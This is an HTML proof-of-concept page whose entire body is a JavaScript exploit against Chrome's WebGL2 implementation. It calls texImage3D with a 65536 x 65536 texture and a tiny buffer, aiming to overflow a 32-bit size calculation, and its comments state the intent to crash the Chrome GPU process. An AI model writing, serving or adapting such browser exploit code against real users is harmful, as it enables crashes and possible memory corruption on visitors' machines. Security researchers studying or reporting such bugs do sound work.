<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>POC</title>
</head>
<body>

  <h1>POC test</h1>

  <script>
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl2');
    
    // Dimensions to overflow 32-bit multiplication
    // 65536 * 65536 = 0x100000000 -> truncates to 0 in 32-bit
    const width = 65536; 
    const height = 65536;
    const depth = 1;
    
    // Trigger the vulnerable HandleTexImage3D parser
    // This should crash the Chrome GPU process instantly
    gl.texImage3D(
        gl.TEXTURE_3D, 
        0, 
        gl.RGBA8, 
        width, 
        height, 
        depth, 
        0, 
        gl.RGBA, 
        gl.UNSIGNED_BYTE, 
        new Uint8Array(16) // Tiny buffer, but driver thinks it needs gigabytes!
    );

  </script>

</body>
</html>
